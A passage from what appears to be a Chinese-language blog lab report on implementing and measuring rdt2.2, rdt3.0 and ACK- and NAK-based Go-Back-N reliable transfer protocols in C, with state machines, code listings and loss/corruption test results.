STATE_WAIT_ACK_EVEN:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;STATE_WAIT_ACK_EVEN\n&quot;</span>);</span><br><span class="line">    rcvpkt = rdt_rcv(sockfd, &amp;client_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (corrupt(rcvpkt) || isACKOdd(rcvpkt))          <span class="comment">// key step</span></span><br><span class="line">    &#123;</span><br><span class="line">        udt_send(sockfd, sndpkt, &amp;client_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (notcorrupt(rcvpkt) &amp;&amp; isACKEven(rcvpkt))  <span class="comment">// key step</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">free</span>(sndpkt);</span><br><span class="line">        currentState = STATE_WAIT_FOR_CALL_ODD_FROM_ABOVE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(rcvpkt);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> STATE_WAIT_FOR_CALL_ODD_FROM_ABOVE:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;STATE_WAIT_FOR_CALL_ODD_FROM_ABOVE\n&quot;</span>);</span><br><span class="line">    data = rdt_send(seq);</span><br><span class="line">    sndpkt = make_pkt(seq, PACKET_TYPE_DATA, data);</span><br><span class="line">    udt_send(sockfd, sndpkt, &amp;client_addr);</span><br><span class="line">    seq++;</span><br><span class="line">    <span class="comment">// rdt v2.1</span></span><br><span class="line">    <span class="comment">// currentState = STATE_WAIT_ACK_NAK_ODD;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// rdt v2.2</span></span><br><span class="line">    currentState = STATE_WAIT_ACK_ODD;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rdt v2.1</span></span><br><span class="line"><span class="comment">// case STATE_WAIT_ACK_NAK_ODD:</span></span><br><span class="line"><span class="comment">//     printf(&quot;STATE_WAIT_ACK_NAK_ODD\n&quot;);</span></span><br><span class="line"><span class="comment">//     rcvpkt = rdt_rcv(sockfd, &amp;client_addr);</span></span><br><span class="line"><span class="comment">//     if (corrupt(rcvpkt) || isNAK(rcvpkt))</span></span><br><span class="line"><span class="comment">//     &#123;</span></span><br><span class="line"><span class="comment">//         udt_send(sockfd, sndpkt, &amp;client_addr);</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//     else if (notcorrupt(rcvpkt) &amp;&amp; isACK(rcvpkt))</span></span><br><span class="line"><span class="comment">//     &#123;</span></span><br><span class="line"><span class="comment">//         free(sndpkt);</span></span><br><span class="line"><span class="comment">//         currentState = STATE_WAIT_FOR_CALL_EVEN_FROM_ABOVE;</span></span><br><span class="line"><span class="comment">//         if (seq == TOTAL_PACKETS)</span></span><br><span class="line"><span class="comment">//             finish_send = TRUE;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//     free(rcvpkt);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// rdt v2.2</span></span><br><span class="line"><span class="keyword">case</span> STATE_WAIT_ACK_ODD:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;STATE_WAIT_ACK_ODD\n&quot;</span>);</span><br><span class="line">    rcvpkt = rdt_rcv(sockfd, &amp;client_addr);</span><br><span class="line">    <span class="keyword">if</span> (corrupt(rcvpkt) || isACKEven(rcvpkt))          <span class="comment">// key step</span></span><br><span class="line">    &#123;</span><br><span class="line">        udt_send(sockfd, sndpkt, &amp;client_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (notcorrupt(rcvpkt) &amp;&amp; isACKOdd(rcvpkt))  <span class="comment">// key step</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">free</span>(sndpkt);</span><br><span class="line">        currentState = STATE_WAIT_FOR_CALL_EVEN_FROM_ABOVE;</span><br><span class="line">        <span class="keyword">if</span> (seq == TOTAL_PACKETS)</span><br><span class="line">            finish_send = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(rcvpkt);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-rdt2-2测试"><a href="#3-rdt2-2测试" class="headerlink" title="3. rdt2.2测试"></a>3. rdt2.2测试</h2><p>以数据包错误率为自变量对rdt2.2进行与上述相同的测试，并与rdt2.1的结果进行比较，绘制曲线如下</p><p><img src="/img/2024/05/exp3/2.png" alt="image.png"></p><p><img src="/img/2024/05/exp3/3.png" alt="image.png"></p><p>可以看到，rdt2.2对比rdt2.1发送的数据包总量更少，且有效吞吐量更高，说明rdt2.2确实减少了冗余数据包的发送，相比rdt2.1更为高效</p><h1 id="三、实现rdt3-0"><a href="#三、实现rdt3-0" class="headerlink" title="三、实现rdt3.0"></a>三、实现rdt3.0</h1><h2 id="1-理解rdt3-0"><a href="#1-理解rdt3-0" class="headerlink" title="1. 理解rdt3.0"></a>1. 理解rdt3.0</h2><p>上述模型能够解决的只是数据包损坏的问题，一旦出现某个数据包丢包，对于以上模型都无法作出响应保证传输的可靠性</p><p>因此rdt3.0引入超时重传：</p><p>在发送端，<strong>每发一个数据包便开启一个计时器</strong>，当计时器超时仍未正常收到该数据包对应的ACK时，<strong>重传</strong>该数据包并<strong>重启计时器</strong>。</p><p>在rdt3.0中，<strong>只有计时器超时</strong>才会触发<strong>重传</strong>动作，收到受损的ACK或不正确的ACK不会触发重传。</p><p>因此，发送端状态机如下：</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  stateDiagram   state &quot;Wait for call 0 from above&quot; as st1   state &quot;Wait for ACK 0&quot; as st2   state &quot;Wait for call 1 from above&quot; as st3   state &quot;Wait for ACK 1&quot; as st4   [*] --&gt; st1   st1 --&gt; st2: rdt_send(data) &lt;br&gt;  sndpkt&#x3D;make_pkt(0, data, checksum) udt_send(sndpkt) start_timer   st2 --&gt; st2: timeout &lt;br&gt; udt_send(sndpkt) start_timer   st2 --&gt; st3: rdt_rcv(rcvpkt) &amp;&amp; notcorrupt(rcvpkt) &amp;&amp; isACK(rcvpkt, 0) &lt;br&gt; stop_timer    st3 --&gt; st4: rdt_send(data) &lt;br&gt;  sndpkt&#x3D;make_pkt(1, data, checksum) udt_send(sndpkt) start_timer   st4 --&gt; st4: timeout &lt;br&gt; udt_send(sndpkt) start_timer   st4 --&gt; st1: rdt_rcv(rcvpkt) &amp;&amp; notcorrupt(rcvpkt) &amp;&amp; isACK(rcvpkt, 1) &lt;br&gt; stop_timer  </pre></div><h2 id="2-rdt3-0代码实现"><a href="#2-rdt3-0代码实现" class="headerlink" title="2. rdt3.0代码实现"></a>2. rdt3.0代码实现</h2><p>首先定义定时器传入的函数，内容为重传当前数据包：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> CALLBACK <span class="title function_">timeout_function</span><span class="params">(<span class="type">void</span> *lpParam, boolean timeout)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(timeout )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Time out!\n&quot;</span>);</span><br><span class="line">        start_timer(timeout_function);</span><br><span class="line">        udt_send(sockfd, sndpkt, &amp;client_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在状态<strong>STATE_WAIT_FOR_CALL_EVEN_FROM_ABOVE</strong>和<strong>STATE_WAIT_FOR_CALL_ODD_FROM_ABOVE</strong>中，完成发送数据包时启动定时器；在状态<strong>STATE_WAIT_ACK_EVEN</strong>和<strong>STATE_WAIT_ACK_ODD</strong>中，修改代码使只有成功接收时才执行动作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (currentState)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> STATE_WAIT_FOR_CALL_EVEN_FROM_ABOVE:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;STATE_WAIT_FOR_CALL_EVEN_FROM_ABOVE\n&quot;</span>);</span><br><span class="line">    data = rdt_send(seq);</span><br><span class="line">    sndpkt = make_pkt(seq, PACKET_TYPE_DATA, data);</span><br><span class="line">    udt_send(sockfd, sndpkt, &amp;client_addr);</span><br><span class="line">    seq++;</span><br><span class="line">    start_timer(timeout_function);  <span class="comment">// key step</span></span><br><span class="line"></span><br><span class="line">    currentState = STATE_WAIT_ACK_EVEN;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> STATE_WAIT_ACK_EVEN:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;STATE_WAIT_ACK_EVEN\n&quot;</span>);</span><br><span class="line">    rcvpkt = rdt_rcv(sockfd, &amp;client_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if (corrupt(rcvpkt) || isACKOdd(rcvpkt))         </span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     udt_send(sockfd, sndpkt, &amp;client_addr);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// else </span></span><br><span class="line">    <span class="keyword">if</span> (notcorrupt(rcvpkt) &amp;&amp; isACKEven(rcvpkt))    <span class="comment">// 只有成功接收才有动作，其它无动作</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">free</span>(sndpkt);</span><br><span class="line"></span><br><span class="line">        stop_timer();   <span class="comment">// key step</span></span><br><span class="line">        currentState = STATE_WAIT_FOR_CALL_ODD_FROM_ABOVE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(rcvpkt);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> STATE_WAIT_FOR_CALL_ODD_FROM_ABOVE:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;STATE_WAIT_FOR_CALL_ODD_FROM_ABOVE\n&quot;</span>);</span><br><span class="line">    data = rdt_send(seq);</span><br><span class="line">    sndpkt = make_pkt(seq, PACKET_TYPE_DATA, data);</span><br><span class="line">    udt_send(sockfd, sndpkt, &amp;client_addr);</span><br><span class="line">    seq++;</span><br><span class="line">    start_timer(timeout_function);  <span class="comment">// key step</span></span><br><span class="line"></span><br><span class="line">    currentState = STATE_WAIT_ACK_ODD;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> STATE_WAIT_ACK_ODD:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;STATE_WAIT_ACK_ODD\n&quot;</span>);</span><br><span class="line">    rcvpkt = rdt_rcv(sockfd, &amp;client_addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if (corrupt(rcvpkt) || isACKEven(rcvpkt))</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     udt_send(sockfd, sndpkt, &amp;client_addr);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// else </span></span><br><span class="line">    <span class="keyword">if</span> (notcorrupt(rcvpkt) &amp;&amp; isACKOdd(rcvpkt))  <span class="comment">// 只有成功接收才有动作，其它无动作</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">free</span>(sndpkt);</span><br><span class="line">        </span><br><span class="line">        stop_timer();   <span class="comment">// key step</span></span><br><span class="line">        currentState = STATE_WAIT_FOR_CALL_EVEN_FROM_ABOVE;</span><br><span class="line">        <span class="keyword">if</span> (seq == TOTAL_PACKETS)</span><br><span class="line">            finish_send = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(rcvpkt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-rdt3-0测试"><a href="#3-rdt3-0测试" class="headerlink" title="3. rdt3.0测试"></a>3. rdt3.0测试</h2><p>在clumsy中设置 <strong>数据包损坏率Tamper</strong> 为1，改变 <strong>丢包率Drop</strong> 依次为0.3, 0.5, 1, 2, 3, 5, 10, 20, 30</p><p>分别绘制 <strong>数据包总数OverHead</strong> 和 <strong>有效吞吐量Goodput</strong> 关于 <strong>丢包率</strong> 的关系曲线如下：</p><p><img src="/img/2024/05/exp3/4.png" alt="image.png"></p><p><img src="/img/2024/05/exp3/5.png" alt="image.png"></p><p>发现 数据包总数-丢包率 的图像呈非线性曲线增长，而 有效吞吐量-丢包率 的图像呈指数型下降</p><h1 id="四、实现基于ACK的GBN"><a href="#四、实现基于ACK的GBN" class="headerlink" title="四、实现基于ACK的GBN"></a>四、实现基于ACK的GBN</h1><p>前面说到的模型都是基于停等协议，需要收到前一个数据包对应的ACK才会接着发送下一个数据包，这种情况下信道占用率很不可观</p><p>回退N帧协议（Go Back N，or GBN）在发送端维护一个长度为N的窗口，已收到ACK部分的末位置base，以及下一个要发送的数据包的位置next_seq_num；在接收端按顺序逐一接收并发送ACK</p><p>根据文档给出的状态机模型，实现GBN的发送端和接收端如下：</p><p>发送端：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> N = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> base = <span class="number">1</span>, next_seq_num = <span class="number">1</span>;                 <span class="comment">// 定义GBN所需全局变量</span></span><br></pre></td></tr></table></figure><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sending_packets</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 初始化状态</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *data;</span><br><span class="line">    Packet *rcvpkt;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// get start_time</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> start_time = GetTickCount();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (base != TOTAL_PACKETS + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(next_seq_num &lt; base + N &amp;&amp; next_seq_num &lt;= TOTAL_PACKETS)&#123;</span><br><span class="line">            data = rdt_send(next_seq_num);</span><br><span class="line">            sndpkt[next_seq_num] = make_pkt(next_seq_num, PACKET_TYPE_DATA, data);</span><br><span class="line">            udt_send(sockfd, sndpkt[next_seq_num], &amp;client_addr);</span><br><span class="line">            <span class="keyword">if</span>(base == next_seq_num)</span><br><span class="line">                start_timer(timeout_function);</span><br><span class="line">            next_seq_num++;</span><br><span class="line">        &#125;</span><br><span class="line">        rcvpkt = rdt_rcv(sockfd, &amp;client_addr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(notcorrupt(rcvpkt))&#123;</span><br><span class="line">            base = get_ack_num(rcvpkt) + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(base == next_seq_num)</span><br><span class="line">                stop_timer();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                start_timer(timeout_function);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get end_time</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> end_time = GetTickCount();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// calculate goodput</span></span><br><span class="line">    calculate_goodput(start_time, end_time);</span><br><span class="line">    <span class="comment">// get overhead</span></span><br><span class="line">    getOverHead();</span><br><span class="line">    <span class="comment">// get tamper rate</span></span><br><span class="line">    calculate_tamper_rate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>接收端：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">receiving_packets</span><span class="params">()</span>&#123;</span><br><span class="line">    Packet *rcvpkt;</span><br><span class="line">    Packet* sndpkt;</span><br><span class="line">    <span class="type">int</span> rcv_seq = <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> expected_seq_num = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        rcvpkt = rdt_rcv(sockfd, &amp;server_addr);</span><br><span class="line">        <span class="keyword">if</span>(notcorrupt(rcvpkt) &amp;&amp; has_seq_num(rcvpkt, expected_seq_num))&#123;</span><br><span class="line">            extract_data(rcvpkt);</span><br><span class="line">            sndpkt = make_pkt(expected_seq_num, PACKET_TYPE_ACK, <span class="literal">NULL</span>);</span><br><span class="line">            udt_send(sockfd, sndpkt, &amp;server_addr);</span><br><span class="line">            expected_seq_num++;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(notcorrupt(rcvpkt) &amp;&amp; rcvpkt-&gt;seq &lt; expected_seq_num)&#123;</span><br><span class="line">            sndpkt = make_pkt(rcvpkt-&gt;seq, PACKET_TYPE_ACK, <span class="literal">NULL</span>);</span><br><span class="line">            udt_send(sockfd, sndpkt, &amp;server_addr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">boolean <span class="title function_">has_seq_num</span><span class="params">(Packet *rcvpkt, <span class="type">int</span> expected_seq_sum)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> rcvpkt-&gt;seq == expected_seq_sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="五、实现基于NAK的GBN"><a href="#五、实现基于NAK的GBN" class="headerlink" title="五、实现基于NAK的GBN"></a>五、实现基于NAK的GBN</h1><p>该模型中，在发送端缓存数据包后持续发送，直到收到接收端返回的NAK错误，再重发出错数据包，并继续持续发送之后的数据包；在接收端按顺序逐一接收，如出现错误则发送NAK</p><p>代码实现上，在发送端维护两个全局变量：next_seq_num表示下一个要发送的数据包下标，naks_done表示关于NAK的错误已被处理，用于两个线程间通信，截断持续发送的过程</p><p>发送端：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义全局变量</span></span><br><span class="line"><span class="type">int</span> next_seq_num = <span class="number">0</span>;</span><br><span class="line">boolean naks_done = TRUE;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *data;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TOTAL_PACKETS; ++i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 预先装填所有数据</span></span><br><span class="line">    data = rdt_send(i);</span><br><span class="line">    sndpkt[i] = make_pkt(i, PACKET_TYPE_DATA, data);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(next_seq_num &lt; TOTAL_PACKETS)&#123;</span><br><span class="line">    <span class="keyword">if</span>(naks_done)&#123;</span><br><span class="line">        udt_send(sockfd, sndpkt[next_seq_num], &amp;client_addr);</span><br><span class="line">        next_seq_num++;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">receive_naks</span><span class="params">(LPVOID pl_param)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 服务器应一直监听来自客户端的数据包</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// int last_nak_num = -1;</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 收到NAK处理重发</span></span><br><span class="line">        Packet *rcvpkt = rdt_rcv(sockfd, &amp;client_addr);</span><br><span class="line">        naks_done = FALSE;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(notcorrupt(rcvpkt) &amp;&amp; isNAK(rcvpkt))&#123; </span><br><span class="line">            udt_send(sockfd, sndpkt[rcvpkt-&gt;seq], &amp;client_addr);    <span class="comment">// 防止最后一个丢包</span></span><br><span class="line">            next_seq_num = rcvpkt-&gt;seq + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        naks_done = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接收端：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义为全局</span></span><br><span class="line"><span class="type">int</span> max_seq_received = <span class="number">-1</span>;   <span class="comment">// 目前为止按序接收到的最大序号</span></span><br><span class="line">boolean packet_received = <span class="number">0</span>; <span class="comment">// 是否接收完成的标志</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LOOP 1: 检查是否收到的包是否发生了比特错误</span></span><br><span class="line"><span class="keyword">if</span> (corrupt(rcvpkt))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// TODO</span></span><br><span class="line">    sndpkt = make_pkt(max_seq_received + <span class="number">1</span>, PACKET_TYPE_NAK, <span class="literal">NULL</span>);</span><br><span class="line">    udt_send(sockfd, sndpkt, &amp;server_addr);</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LOOP 2: 检查是否收到的包是否为按序到达的</span></span><br><span class="line"><span class="keyword">if</span> (rcvpkt-&gt;seq == max_seq_received + <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// TODO</span></span><br><span class="line">    extract_data(rcvpkt);</span><br><span class="line">    max_seq_received++;</span><br><span class="line">    <span class="keyword">if</span>(max_seq_received == TOTAL_PACKETS - <span class="number">1</span>)</span><br><span class="line">        packet_received = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        stop_timer();</span><br><span class="line">        start_timer(timer_process);</span><br><span class="line">    &#125;                </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LOOP 3: 检查是否收到的包是否为乱序到达的</span></span><br><span class="line"><span class="keyword">if</span> (rcvpkt-&gt;seq &gt; max_seq_received + <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// TODO</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;receive a packet out of order: %d\n&quot;</span>, rcvpkt-&gt;seq);</span><br><span class="line">    sndpkt = make_pkt(max_seq_received + <span class="number">1</span>, PACKET_TYPE_NAK, <span class="literal">NULL</span>);</span><br><span class="line">    udt_send(sockfd, sndpkt, &amp;server_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定时器到期后触发的回调函数</span></span><br><span class="line">VOID CALLBACK <span class="title function_">timer_process</span><span class="params">(PVOID lpParam, BOOLEAN TimerOrWaitFired)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (TimerOrWaitFired)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 定时器到期处理逻辑</span></span><br><span class="line">        start_timer(timer_process);</span><br><span class="line">        Packet *sndpkt = make_pkt(max_seq_received + <span class="number">1</span>, PACKET_TYPE_NAK, <span class="literal">NULL</span>);</span><br><span class="line">        udt_send(sockfd, sndpkt, &amp;server_addr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Notice: 若有需要，可以重置定时器，为下一个预期的数据包启动新的定时器，如在这里继续调用 set_or_update_timer 函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="六、量化分析"><a href="#六、量化分析" class="headerlink" title="六、量化分析"></a>六、量化分析</h1><p>该部分实验将测试ACK-GBN和NAK-GBN的执行过程中，<strong>数据包总量OverHead</strong>和<strong>有效吞吐量Goodput</strong>关于多个不同自变量的变化关系</p><h2 id="1-关于数据包错误率"><a href="#1-关于数据包错误率" class="headerlink" title="1. 关于数据包错误率"></a>1. 关于数据包错误率</h2><p><img src="/img/2024/05/exp3/6.png" alt="image.png"></p><p><img src="/img/2024/05/exp3/7.png" alt="image.png"></p><h2 id="2-关于丢包率"><a href="#2-关于丢包率" class="headerlink" title="2. 关于丢包率"></a>2. 关于丢包率</h2><p><img src="/img/2024/05/exp3/8.png" alt="image.png"></p><p><img 